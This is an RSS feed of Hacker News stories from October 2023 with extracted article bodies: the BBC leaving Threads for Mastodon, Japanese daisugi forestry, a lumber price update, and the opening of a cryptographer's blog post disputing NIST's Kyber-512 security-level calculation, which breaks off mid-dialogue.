<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 04 Oct 2023 05:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[BBC gives up on Threads, sticks with Mastodon (133 pts)]]></title>
            <link>https://darnell.day/bbc-gives-up-on-threads-by-instagram-sticks-with-mastodon</link>
            <guid>37759871</guid>
            <pubDate>Wed, 04 Oct 2023 01:37:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://darnell.day/bbc-gives-up-on-threads-by-instagram-sticks-with-mastodon">https://darnell.day/bbc-gives-up-on-threads-by-instagram-sticks-with-mastodon</a>, See on <a href="https://news.ycombinator.com/item?id=37759871">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img src="https://i.snap.as/LxUHCO5k.jpeg" alt="BBC News icon"></p>

<p>So numerous brands are giving up on <a href="https://threads.net/">Threads</a> by <a href="https://instagram.com/">Instagram</a>, allegedly due to lack of engagement (ironically, most of them are still using <a href="https://x.com/">X</a>, formally known as <a href="https://twitter.com/">Twitter</a>).</p>

<p>What makes this news more interesting is the fact that the <a href="https://www.bbc.com/">British Broadcasting Corporation</a> (BBC) has abandoned its Threads account but is still maintaining its self-hosted Mastodon accounts online.</p>

<blockquote><p>The <a href="https://www.threads.net/@nfl">National Football League</a> hasn't posted anything in six weeks, before the start of the regular season. This is the nation's most popular sports league, and it has completely abandoned Meta's new platform. Even with its 1.9 million followers.</p>

<p>Among news publishers, the British Broadcasting Corporation (BBC) <a href="https://www.threads.net/@bbc">stopped posting</a>to Threads 11 weeks ago, not long after the launch. <a href="https://www.threads.net/@cbsnews">CBS News</a> hasn't posted in five weeks. (<a href="https://ktla.com/news/some-major-brands-are-giving-up-on-threads-as-engagement-craters/">KTLA5</a>)</p></blockquote>

<p>Earlier in the year (at the end of July), the BBC announced that they were <a href="https://www.bbc.com/rd/blog/2023-07-mastodon-distributed-decentralised-fediverse-activitypub">engaging in a six-month experiment</a> with <a href="https://joinmastodon.org/">Mastodon</a>, &amp; even self-hosted their content on their custom domain: <a href="https://social.bbc/">Social.bbc</a> (how cool is that!).</p>

<p>While accounts like <a href="https://darnell.day/@/BBC5Live@social.bbc">@<span>BBC5Live@social.bbc</span></a> &amp; <a href="https://darnell.day/@/BBCRadio4@social.bbc">@<span>BBCRadio4@social.bbc</span></a> remain relatively active, <a href="https://darnell.day/@/bbc@threads.net">@<span>bbc@threads.net</span></a> appears abandoned, despite boasting far higher engagement levels on <a href="https://meta.com/">Meta</a>’s Twitter rival (now called X).</p>

<p>But why would the BBC abandon Threads while maintaining a presence on Mastodon as well as other social media platforms‽ There are three possible theories:</p>
<ul><li><p>BBC might be weary of posting content to Threads after Meta <a href="https://www.wired.com/story/meta-facebook-instagram-news-block-canada-wildfire/">geo-banned Canadian news outlets</a> after Canadian legislators passed a “news tax” law (<strong>note:</strong> the law is silly, but I digress).</p></li>

<li><p>BBC prefers to control its social narrative, &amp; will redirect followers from Threads to their Mastodon accounts once Threads joins the Fediverse.</p></li>

<li><p>BBC thinks Threads is a waste of time &amp; resources as Threads lacks a public API to help automate posting news to their account.</p></li></ul>

<p>Could the BBC eventually shut down their Mastodon account by the time 2024 arrives‽ Sure. But I suspect that <a href="https://www.zdnet.com/article/twitter-seeing-record-user-engagement-the-data-tells-a-different-story/">with X dying</a>, Threads stagnating, &amp; Meta raging, the BBC might keep their Mastodon account active to avoid having their voice limited online.</p>

<p>👨🏾‍💻 by <a href="https://www.darnellclayton.com/">Darnell Clayton</a> 🔛 <a href="https://darnell.day/@/darnell@darnell.day">@<span>darnell@darnell.day</span></a></p>

<p>🕺🏾 Follow my adventures upon:
👉🏾 <a href="https://darnell.day/@/darnell@one.darnell.one">@<span>darnell@one.darnell.one</span></a> 🐘 (<a href="https://one.darnell.one/@darnell">Mastodon</a>)
👉🏾 <a href="https://darnell.day/@/darnell@darnell.moe">@<span>darnell@darnell.moe</span></a> 🦁 (<a href="https://darnell.moe/@darnell">Misskey</a>)
👉🏾 <a href="https://darnell.day/@/darnell@threads.net">@<span>darnell@threads.net</span></a> 🧵 (<a href="https://threads.net/@darnell">Threads</a>)</p>

<p>🦹🏾‍♂️ Other digital havens:
👉🏾 <a href="https://darnell.day/@/darnell@darnell.app">@<span>darnell@darnell.app</span></a> 📸 (<a href="https://darnell.app/darnell">Pixelfed</a>)
👉🏾 <a href="https://darnell.day/@/darnelltv@darnell.tv">@<span>darnelltv@darnell.tv</span></a> 👨🏾‍💻 (<a href="https://darnell.tv/">WordPress</a>)
👉🏾 <a href="https://darnell.day/@/darnell@counter.social">@<span>darnell@counter.social</span></a> 🥷🏾 (<a href="https://counter.social/@darnell">Counter Social</a>)</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Daisugi, the Japanese technique of growing trees out of other trees (2020) (121 pts)]]></title>
            <link>https://www.openculture.com/2020/10/daisugi.html</link>
            <guid>37759366</guid>
            <pubDate>Wed, 04 Oct 2023 00:18:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.openculture.com/2020/10/daisugi.html">https://www.openculture.com/2020/10/daisugi.html</a>, See on <a href="https://news.ycombinator.com/item?id=37759366">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			<p><img loading="lazy" decoding="async" fetchpriority="high" src="https://cdn8.openculture.com/2020/10/22214022/Daisugi-3.jpg" alt="" width="640" height="427" srcset="https://cdn8.openculture.com/2020/10/22214022/Daisugi-3.jpg 640w, https://cdn8.openculture.com/2020/10/22214022/Daisugi-3-360x240.jpg 360w, https://cdn8.openculture.com/2020/10/22214022/Daisugi-3-240x160.jpg 240w, https://cdn8.openculture.com/2020/10/22214022/Daisugi-3-300x200.jpg 300w" sizes="(max-width: 640px) 100vw, 640px" data-old-src="https://www.openculture.com/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn8.openculture.com/2020/10/22214022/Daisugi-3.jpg" data-srcset="https://cdn8.openculture.com/2020/10/22214022/Daisugi-3.jpg 640w, https://cdn8.openculture.com/2020/10/22214022/Daisugi-3-360x240.jpg 360w, https://cdn8.openculture.com/2020/10/22214022/Daisugi-3-240x160.jpg 240w, https://cdn8.openculture.com/2020/10/22214022/Daisugi-3-300x200.jpg 300w"></p>
<p><small><em><a href="https://twitter.com/wrathofgnon/status/1250287741247426565">Image by Wrath of Gnon</a></em></small></p>
<p>We’ve all admired the elegance of Japan’s traditional styles of architecture. Their development required the kind of dedicated craftsmanship that takes generations to cultivate — but also, more practically speaking, no small amount of wood. By the 15th century, Japan already faced a shortage of seedlings, as well as land on which to properly cultivate the trees in the first place. Necessity being the mother of invention, this led to the creation of an ingenious solution: <em>daisugi</em>, the growing of additional trees, in effect, out of existing trees — creating, in other words, a kind of giant <a href="http://www.openculture.com/2020/01/the-art-philosophy-of-bonsai.html">bonsai</a>.</p>
<p>“Written as 台杉 and literally meaning <em>platform cedar</em>, the technique resulted in a tree that resembled an open palm with multiple trees growing out if it, perfectly vertical,” <a href="https://www.spoon-tamago.com/2020/10/20/daisugi-japanese-forestry-technique/">writes Spoon and Tamago’s Johnny Waldman</a>. “Done right, the technique can prevent deforestation and result in perfectly round and straight timber known as <em>taruki</em>, which are used in the roofs of Japanese teahouses.”</p>


<p>These teahouses are still prominent in Kyoto, a city still known for its traditional cultural heritage, and not coincidentally where&nbsp;<em>daisugi</em> first developed. “It’s said that it was Kyoto’s preeminent tea master, <a href="http://thekyotoproject.org/english/sen-no-rikyu-the-greatest-tea-master/">Sen-no-rikyu</a>, who demanded perfection in the Kitayama cedar during the 16th century,” <a href="https://mymodernmet.com/kitayama-cedar-daisugi/">writes My Modern Met’s Jessica Stewart</a>.</p>
<p><img loading="lazy" decoding="async" src="https://cdn8.openculture.com/2020/10/22223540/daisugi-2.jpeg" alt="" width="640" height="797" srcset="https://cdn8.openculture.com/2020/10/22223540/daisugi-2.jpeg 640w, https://cdn8.openculture.com/2020/10/22223540/daisugi-2-289x360.jpeg 289w, https://cdn8.openculture.com/2020/10/22223540/daisugi-2-193x240.jpeg 193w, https://cdn8.openculture.com/2020/10/22223540/daisugi-2-300x374.jpeg 300w" sizes="(max-width: 640px) 100vw, 640px" data-old-src="https://www.openculture.com/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn8.openculture.com/2020/10/22223540/daisugi-2.jpeg" data-srcset="https://cdn8.openculture.com/2020/10/22223540/daisugi-2.jpeg 640w, https://cdn8.openculture.com/2020/10/22223540/daisugi-2-289x360.jpeg 289w, https://cdn8.openculture.com/2020/10/22223540/daisugi-2-193x240.jpeg 193w, https://cdn8.openculture.com/2020/10/22223540/daisugi-2-300x374.jpeg 300w"></p>
<p>At the time “a form of very straight and stylized <a href="https://www.rethinktokyo.com/sukiya-zukuri-japanese-architecture"><em>sukiya-zukuri</em></a> architecture was high fashion, but there simply weren’t nearly enough raw materials to build these homes for every noble or samurai who wanted one,” says <a href="https://twitter.com/wrathofgnon/status/1250287741247426565">a thread by Twitter account Wrath of Gnon</a>, which includes these and other photos of <em>daisugi</em> in action. “Hence this clever solution of using bonsai techniques on trees.” Aesthetics aside — as far aside as they ever get in Japan, at any rate — “the lumber produced in this method is 140% as flexible as standard cedar and 200% as dense/strong,” making it “absolutely perfect for rafters and roof timber.” And not only is&nbsp;<em>daisugi</em>‘s product straight, slender, and typhoon-resistant, it’s&nbsp;marveled at around the world 600 years later. Of how many forestry techniques can we say the same?</p>
<p>via <a href="https://www.spoon-tamago.com/2020/10/20/daisugi-japanese-forestry-technique/">Spoon and Tamago</a></p>
<p><strong>Related Content:</strong></p>
<p><a href="http://www.openculture.com/2020/01/the-art-philosophy-of-bonsai.html">The Art &amp; Philosophy of Bonsai</a></p>
<p><a href="http://www.openculture.com/2017/02/this-392-year-old-bonsai-tree-survived-the-hiroshima-atomic-blast-still-flourishes-today.html">This 392-Year-Old Bonsai Tree Survived the Hiroshima Atomic Blast &amp; Still Flourishes Today: The Power of Resilience</a></p>
<p><a href="http://www.openculture.com/2017/10/the-philosophical-appreciation-of-rocks-in-china-japan.html">The Philosophical Appreciation of Rocks in China &amp; Japan: A Short Introduction to an Ancient Tradition</a></p>
<p><a href="http://www.openculture.com/2019/07/the-secret-language-of-trees.html">The Secret Language of Trees: A Charming Animated Lesson Explains How Trees Share Information with Each Other</a></p>
<p><a href="http://www.openculture.com/2017/10/the-social-lives-of-trees.html">The Social Lives of Trees: Science Reveals How Trees Mysteriously Talk to Each Other, Work Together &amp; Form Nurturing Families</a></p>
<p><a href="http://www.openculture.com/2019/08/a-digital-animation-compares-the-size-of-trees-from-the-3-inch-bonsai-to-the-300-foot-sequoia.html">A Digital Animation Compares the Size of Trees: From the 3-Inch Bonsai, to the 300-Foot Sequoia</a></p>
<p><em>Based in Seoul,&nbsp;<a href="http://blog.colinmarshall.org/">Colin Marshall</a>&nbsp;writes and broadcasts on cities, language, and culture. His projects include the Substack newsletter</em>&nbsp;<a href="https://colinmarshall.substack.com/">Books on Cities</a>,<em>&nbsp;the book&nbsp;</em>The Stateless City: a Walk through 21st-Century Los Angeles&nbsp;<em>and the video series&nbsp;</em><a href="https://vimeo.com/channels/thecityincinema">The City in Cinema</a><em>. Follow him on Twitter at&nbsp;<a href="https://twitter.com/#%21/colinmarshall">@colinmarshall</a>, on&nbsp;<a href="https://www.facebook.com/colinmarshallessayist">Facebook</a>, or on&nbsp;<a href="https://www.instagram.com/colinmarshallseoul/">Instagram</a>.</em></p>
<br>		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lumber prices down 11% YoY (149 pts)]]></title>
            <link>https://www.calculatedriskblog.com/2023/10/update-lumber-prices-down-11-yoy.html</link>
            <guid>37756714</guid>
            <pubDate>Tue, 03 Oct 2023 19:55:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.calculatedriskblog.com/2023/10/update-lumber-prices-down-11-yoy.html">https://www.calculatedriskblog.com/2023/10/update-lumber-prices-down-11-yoy.html</a>, See on <a href="https://news.ycombinator.com/item?id=37756714">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-version="1" id="main-wrap1">
<h3>
<a href="https://www.calculatedriskblog.com/2023/10/update-lumber-prices-down-11-yoy.html">Update: Lumber Prices Down 11% YoY</a>
</h3>
<p><span size="-1">by <span>Calculated Risk on <abbr title="2023-10-03T14:42:00-04:00">10/03/2023 02:42:00 PM</abbr></span></span></p>


<div>
<p>Here is another monthly update on lumber prices.</p><p><b>SPECIAL NOTE:</b> The <a href="https://www.cmegroup.com/content/dam/cmegroup/notices/ser/2023/04/SER-9183.pdf">CME group discontinued</a> the Random Length Lumber Futures contract on May 16th.  I've now switched to a new physically-delivered Lumber Futures contract that was started in August 2022.&nbsp;</p><div><p>Unfortunately, this impacts long term price comparisons since the new contract was priced about 24% higher than the old random length contract for the period both contracts were available.</p><p>

This graph shows CME random length framing futures through last August (blue), and the new physically-delivered Lumber Futures (LBR) contract starting in August 2022 (Red).</p><p>LBR is currently at $491.50 per 1000 board feet, down 11% from $550.00 a year ago.</p><div>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-nrnFu0Tnc6yBc5n7GnpBs5C9ywhzj5fhhBH7QmZ7pP9b3aapUJPgQahl3g0BSQWAzcmSmPL-qF_uNxg_zLlR1bR0K0lwscZYMAGhm4OQHKU5qUwznyerW6ywaEAtd1jLa5EKJ7XDNQBKqRT6Bmuey_Q7VBu_VghRkwsQlcV7z4nKm18_tBZb/s1001/LumberOct32023.PNG"><img alt="Lumber Prices" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-nrnFu0Tnc6yBc5n7GnpBs5C9ywhzj5fhhBH7QmZ7pP9b3aapUJPgQahl3g0BSQWAzcmSmPL-qF_uNxg_zLlR1bR0K0lwscZYMAGhm4OQHKU5qUwznyerW6ywaEAtd1jLa5EKJ7XDNQBKqRT6Bmuey_Q7VBu_VghRkwsQlcV7z4nKm18_tBZb/s320/LumberOct32023.PNG"></a><i><b><span>Click on graph for larger image.</span></b></i></p><p>There is somewhat of a seasonal demand for lumber, and lumber prices usually peak in April or May.</p><div><p>
We didn't see a significant runup in prices this Spring due to the housing slowdown.</p></div></div></div>


</div>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Debunking NIST's calculation of the Kyber-512 security level (312 pts)]]></title>
            <link>https://blog.cr.yp.to/20231003-countcorrectly.html</link>
            <guid>37756656</guid>
            <pubDate>Tue, 03 Oct 2023 19:49:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.cr.yp.to/20231003-countcorrectly.html">https://blog.cr.yp.to/20231003-countcorrectly.html</a>, See on <a href="https://news.ycombinator.com/item?id=37756656">Hacker News</a></p>
<div id="readability-page-1" class="page">
<h2>The cr.yp.to <a href="https://blog.cr.yp.to/index.html" accesskey="i">blog</a></h2>
<hr>
<div>
<p>Older (Access-J): <a href="https://blog.cr.yp.to/20230609-turboboost.html" accesskey="j"><b>2023.06.09: Turbo Boost:</b></a> <span>How to perpetuate security problems. #overclocking #performancehype #power #timing #hertzbleed #riskmanagement #environment</span></p>
<details><summary>Table of contents (Access-I for index page)</summary>
<table>
<tbody><tr><td><b>2023.10.03: The inability to count correctly:</b> Debunking NIST's calculation of the Kyber-512 security level. #nist #addition #multiplication #ntru #kyber #fiasco</td></tr>
<tr><td><a href="https://blog.cr.yp.to/20230609-turboboost.html"><b>2023.06.09: Turbo Boost:</b></a> <span>How to perpetuate security problems. #overclocking #performancehype #power #timing #hertzbleed #riskmanagement #environment</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20220805-nsa.html"><b>2022.08.05: NSA, NIST, and post-quantum cryptography:</b></a> <span>Announcing my second lawsuit against the U.S. government. #nsa #nist #des #dsa #dualec #sigintenablingproject #nistpqc #foia</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20220129-plagiarism.html"><b>2022.01.29: Plagiarism as a patent amplifier:</b></a> <span>Understanding the delayed rollout of post-quantum cryptography. #pqcrypto #patents #ntru #lpr #ding #peikert #newhope</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20201206-msword.html"><b>2020.12.06: Optimizing for the wrong metric, part 1: Microsoft Word:</b></a> <span>Review of "An Efficiency Comparison of Document Preparation Systems Used in Academic Research and Development" by Knauff and Nejasmic. #latex #word #efficiency #metrics</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20191024-eddsa.html"><b>2019.10.24: Why EdDSA held up better than ECDSA against Minerva:</b></a> <span>Cryptosystem designers successfully predicting, and protecting against, implementation failures. #ecdsa #eddsa #hnp #lwe #bleichenbacher #bkw</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20190430-vectorize.html"><b>2019.04.30: An introduction to vectorization:</b></a> <span>Understanding one of the most important changes in the high-speed-software ecosystem. #vectorization #sse #avx #avx512 #antivectors</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20171105-infineon.html"><b>2017.11.05: Reconstructing ROCA:</b></a> <span>A case study of how quickly an attack can be developed from a limited disclosure. #infineon #roca #rsa</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20171017-collisions.html"><b>2017.10.17: Quantum algorithms to find collisions:</b></a> <span>Analysis of several algorithms for the collision problem, and for the related multi-target preimage problem. #collision #preimage #pqcrypto</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20170723-random.html"><b>2017.07.23: Fast-key-erasure random-number generators:</b></a> <span>An effort to clean up several messes simultaneously. #rng #forwardsecrecy #urandom #cascade #hmac #rekeying #proofs</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20170719-pqbench.html"><b>2017.07.19: Benchmarking post-quantum cryptography:</b></a> <span>News regarding the SUPERCOP benchmarking system, and more recommendations to NIST. #benchmarking #supercop #nist #pqcrypto</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20161030-pqnist.html"><b>2016.10.30: Some challenges in post-quantum standardization:</b></a> <span>My comments to NIST on the first draft of their call for submissions. #standardization #nist #pqcrypto</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20160607-dueprocess.html"><b>2016.06.07: The death of due process:</b></a> <span>A few notes on technology-fueled normalization of lynch mobs targeting both the accuser and the accused. #ethics #crime #punishment</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20160516-quantum.html"><b>2016.05.16: Security fraud in Europe's "Quantum Manifesto":</b></a> <span>How quantum cryptographers are stealing a quarter of a billion Euros from the European Commission. #qkd #quantumcrypto #quantummanifesto</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20160315-jefferson.html"><b>2016.03.15: Thomas Jefferson and Apple versus the FBI:</b></a> <span>Can the government censor how-to books? What if some of the readers are criminals? What if the books can be understood by a computer? An introduction to freedom of speech for software publishers. #censorship #firstamendment #instructions #software #encryption</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20151120-batchattacks.html"><b>2015.11.20: Break a dozen secret keys, get a million more for free:</b></a> <span>Batch attacks are often much more cost-effective than single-target attacks. #batching #economics #keysizes #aes #ecc #rsa #dh #logjam</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20150314-optimizing.html"><b>2015.03.14: The death of optimizing compilers:</b></a> <span>Abstract of my tutorial at ETAPS 2015. #etaps #compilers #cpuevolution #hotspots #optimization #domainspecific #returnofthejedi</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20150218-printing.html"><b>2015.02.18: Follow-You Printing:</b></a> <span>How Equitrac's marketing department misrepresents and interferes with your work. #equitrac #followyouprinting #dilbert #officespaceprinter</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20140602-saber.html"><b>2014.06.02: The Saber cluster:</b></a> <span>How we built a cluster capable of computing 3000000000000000000000 multiplications per year for just 50000 EUR. #nvidia #linux #howto</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20140517-insns.html"><b>2014.05.17: Some small suggestions for the Intel instruction set:</b></a> <span>Low-cost changes to CPU architecture would make cryptography much safer and much faster. #constanttimecommitment #vmul53 #vcarry #pipelinedocumentation</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20140411-nist.html"><b>2014.04.11: NIST's cryptographic standardization process:</b></a> <span>The first step towards improvement is to admit previous failures. #standardization #nist #des #dsa #dualec #nsa</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20140323-ecdsa.html"><b>2014.03.23: How to design an elliptic-curve signature system:</b></a> <span>There are many choices of elliptic-curve signature systems. The standard choice, ECDSA, is reasonable if you don't care about simplicity, speed, and security. #signatures #ecc #elgamal #schnorr #ecdsa #eddsa #ed25519</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20140213-ideal.html"><b>2014.02.13: A subfield-logarithm attack against ideal lattices:</b></a> <span>Computational algebraic number theory tackles lattice-based cryptography.</span></td></tr>
<tr><td><a href="https://blog.cr.yp.to/20140205-entropy.html"><b>2014.02.05: Entropy Attacks!</b></a> <span>The conventional wisdom says that hash outputs can't be controlled; the conventional wisdom is simply wrong.</span></td></tr>
</tbody></table></details></div><hr>
<h2>2023.10.03: The inability to count correctly: <span>Debunking NIST's calculation of the Kyber-512 security level. #nist #addition #multiplication #ntru #kyber #fiasco</span></h2>
<p><img src="https://blog.cr.yp.to/20231003/longevity.png"></p>
<p>[Sidney Harris cartoon used with permission.
Copyright holder: <a href="http://sciencecartoonsplus.com/">ScienceCartoonsPlus.com</a>.]</p>
<p>Quick, what's 2<sup>40</sup> plus 2<sup>40</sup>?
It's 2<sup>80</sup>, right?</p>
<p>No, obviously not.
40 plus 40 is 80,
and
2<sup>40</sup> <em>times</em> 2<sup>40</sup> is 2<sup>80</sup>,
but
2<sup>40</sup> <em>plus</em> 2<sup>40</sup> is only 2<sup>41</sup>.</p>
<p><strong>Take a deep breath and relax.</strong>
When cryptographers
are analyzing the security of
cryptographic systems,
<em>of course</em>
they don't make stupid mistakes such as
multiplying numbers that should have been added.</p>
<p>If such an error somehow managed to appear,
<em>of course</em> it would immediately be caught
by the robust procedures that cryptographers follow
to thoroughly review security analyses.</p>
<p>Furthermore,
in the context of standardization processes
such as the NIST Post-Quantum Cryptography Standardization Project (NISTPQC),
<em>of course</em> the review procedures are even more stringent.</p>
<p>The only way
for the security claims for modern cryptographic standards
to turn out to fail
would be because of some unpredictable new discovery
revolutionizing the field.</p>
<p><strong>Oops, wait, maybe not.</strong>
In 2022,
NIST announced plans to standardize
a particular cryptosystem, Kyber-512.
As justification, NIST issued claims
regarding the security level of Kyber-512.
In 2023,
NIST issued a draft standard for Kyber-512.</p>
<p>NIST's underlying calculation of the security level
was a severe and indefensible miscalculation.
NIST's primary error is exposed in this blog post,
and boils down to nonsensically <em>multiplying</em> two costs that should have been <em>added</em>.</p>
<p>How did such a serious error
slip past NIST's review process?
Do we dismiss this as an isolated incident?
Or do we conclude that something is fundamentally broken
in the procedures that NIST is following?</p>
<p><strong>Discovering the secret workings of NISTPQC.</strong> 
I filed a FOIA request
<a href="https://blog.cr.yp.to/20220805-nsa.html">"NSA, NIST, and post-quantum cryptography"</a>
in March 2022.
NIST stonewalled, in violation of the law.
Civil-rights firm
<a href="https://loevy.com/">Loevy &amp; Loevy</a>
filed a lawsuit on my behalf.</p>
<p>That lawsuit has been gradually
<a href="https://nist.pqcrypto.org/foia/index.html">revealing</a>
secret NIST documents,
shedding some light on what was actually going on behind the scenes,
including much heavier NSA involvement than indicated by NIST's public narrative.
Compare, for example, the following documents:</p>
<ul>
<li>
<p>A <a href="https://web.archive.org/web/20230910091944/https://csrc.nist.gov/CSRC/media/Events/ISPAB-MARCH-2014-MEETING/documents/a_quantum_world_v1_ispab_march_2014.pdf">public 2014 document</a>
says that its author is
"Post Quantum Cryptography Team, National Institute of Standards and Technology
(NIST), pqc@nist.gov".</p>
</li>
<li>
<p>A <a href="https://nist.pqcrypto.org/foia/index.html#20230815/Re_%20pqc%20mailing%20list(1)-3.pdf">secret 2016 document</a>
listed the actual pqc@nist.gov team members,
with more NSA people
(Nick Gajcowski; David Hubbard; Daniel Kirkwood; Brad Lackey; Laurie Law; John McVey;
Mark Motley; Scott Simon; Jerry Solinas; David Tuller)
than NIST people.
(Another Department of Defense representative on the list
was Jacob Farinholt, Naval Surface Warfare Center, US Navy.
I'm not sure about Evan Bullock.)</p>
</li>
<li>
<p>Another <a href="https://nist.pqcrypto.org/foia/index.html#20230619/Re_%20Your%20visit%20to%20NIST%20.pdf">secret 2016 document</a>
shows that NSA's Scott Simon was scheduled to visit NIST on 12 January 2016.</p>
</li>
<li>
<p>Another <a href="https://nist.pqcrypto.org/foia/index.html#20230508/RE_%20Outline%20for%20PQC%20announcement.pdf">secret 2016 document</a>
shows that NIST's "next meeting with the NSA PQC folks" was scheduled for 26 January 2016.</p>
</li>
<li>
<p>Another <a href="https://nist.pqcrypto.org/foia/index.html#20230508/pqc%20stuff.pdf">secret 2016 document</a>
shows that Michael Groves from NSA's UK partner
was scheduled to visit NIST on 2 February 2016.</p>
</li>
<li>
<p>Another <a href="https://nist.pqcrypto.org/foia/index.html#20230915/Foreign%20Trip%20Report-09232016dm-ykl.doc">secret 2016 document</a>
lists Colin Whorlow from NSA's UK partner
as someone that NIST visited in 2016,
in particular discussing
"confidence and developments for each of the primary PQC families".</p>
</li>
<li>
<p>A <a href="https://web.archive.org/web/20230316130702/https://csrc.nist.gov/CSRC/media/Presentations/pqc-update-round-2-and-beyond/images-media/pqcrypto-sept2020-moody.pdf">public 2020 document</a>
says "Engagement with community and stakeholders.
This includes feedback we received from many, including the NSA.
We keep everyone out of our internal standardization meetings and the decision process.
The feedback received (from the NSA) did not change any of our decisions ...
NIST encouraged the NSA to provide comments publicly.
NIST alone makes the PQC standardization decisions, based on publicly available information, and stands by those decisions".</p>
</li>
</ul>
<p>I filed a new FOIA request in January 2023,
after NIST issued its claims regarding the security level of Kyber-512.
NIST again stonewalled.
Loevy &amp; Loevy has now filed a new lawsuit regarding that FOIA request.</p>
<p>Public material regarding Kyber-512 already shows
how NIST multiplied costs that should have been added,
how NIST sabotaged public review of this calculation,
and how important this calculation was for NIST's narrative of Kyber outperforming NTRU,
filling a critical gap left by other steps
that NIST took to promote the same narrative.
This blog post goes carefully through the details.</p>
<p><strong>Alice and Bob paint a fence.</strong>
At this point you might be thinking
something like this:
"Sorry, no, it's not plausible
that anyone could have mixed up
a formula saying 2<sup>x</sup>+2<sup>y</sup> with a formula saying 2<sup>x+y</sup>,
whatever the motivations might have been."</p>
<p>As a starting point for understanding what happened,
think about schoolchildren in math class facing a word problem:</p>
<blockquote>
<p>There is a fence to paint.
Alice would take 120 minutes to paint the fence.
Bob would take 240 minutes to paint the fence.
How long would it take Alice and Bob
to paint the fence together?</p>
</blockquote>
<p>The approved answer in school
says that Alice paints 1/120 of the fence per minute,
and Bob paints 1/240 of the fence per minute,
so together they paint 1/120 + 1/240 = 1/80 of the fence per minute,
so it takes them 80 minutes to paint the fence.</p>
<p>The real answer could be more complicated
because of second-order effects.
Probably Alice and Bob working together
are getting less tired
than Alice or Bob working alone for longer would have.
In the opposite direction,
maybe there's a slowdown because Alice and Bob
enjoy each other's company
and pause for a coffee.</p>
<p>Schoolchildren often give answers such as
240 − 120 = 120,
or 120 + 240 = 360,
or (120 + 240)/2 = 180.
These children are just manipulating numbers,
not thinking through what the numbers <em>mean</em>.</p>
<p><strong>Two disciplines for catching errors.</strong>
In later years of education,
physics classes
teach students a type-checking discipline
of tracking <em>units</em> with each number.</p>
<p>Here are examples of calculations following this discipline:</p>
<ul>
<li>
<p>Dividing "1 fence" by "120 min"
  gives "0.00833 fence/min".</p>
</li>
<li>
<p>Adding "0.00833 fence/min"
  to "0.00417 fence/min"
  gives "0.01250 fence/min".</p>
</li>
<li>
<p>Taking the reciprocal gives "80.0 min/fence".</p>
</li>
</ul>
<p>The same discipline wouldn't let you add,
for example, "1 fence" to "120 min":
the units don't match.</p>
<p>This discipline avoids many basic errors.
On the other hand,
it still allows, e.g., the mistake of adding
"120 min" to "240 min" to obtain "360 min".</p>
<p>What catches this mistake
is a discipline stronger than tracking units:
namely, tracking <em>semantics</em>.</p>
<p>The numbers have meanings.
They're quantitative features of real objects.
For example,
80 minutes
is the total time for Alice and Bob
to paint the fence
when Alice is painting part of the fence
and Bob is painting part of the fence.
That's what
the question asked us to calculate.</p>
<p>A different question would be
the total time for Alice to paint the fence
and then for Bob to repaint the same fence.
This would be 120 minutes plus 240 minutes.</p>
<p>Yet another question would be
the total time
for Alice to paint the fence,
and then for Bob to wait for the coat
of paint to dry,
and then for Bob to apply a second coat.
Answering this would require more information,
namely the waiting time.</p>
<p>All of these questions make sense.
They pass type-checking.
But their semantics are different.</p>
<p><strong>Alice and Bob tally the costs of an attack.</strong>
Alice and Bob have finished painting
and are now discussing the merits
of different encryption systems.</p>
<p><img src="https://blog.cr.yp.to/20231003/alice-bob.png">
They'd like to make sure that
breaking whichever system they pick
is <em>at least</em> as hard as searching for an AES-128 key.
They've agreed that searching for an AES-128 key
is slightly above 2<sup>140</sup> bit operations.</p>
<p>Alice and Bob are broadcasting their discussion
for anyone who's interested.
Let's listen to what they're saying:</p>
<ul>
<li>
<p>Alice:
"Hmmm,
there are a bunch of sources saying
that the XYZZY attack algorithm uses 2<sup>80</sup> iterations
to break this particular cryptosystem.
It's worrisome that this number is so low.
What else do we know
about the cost of the attack?"</p>
</li>
<li>
<p>Bob:
"I found a source saying
that there are actually extra factors
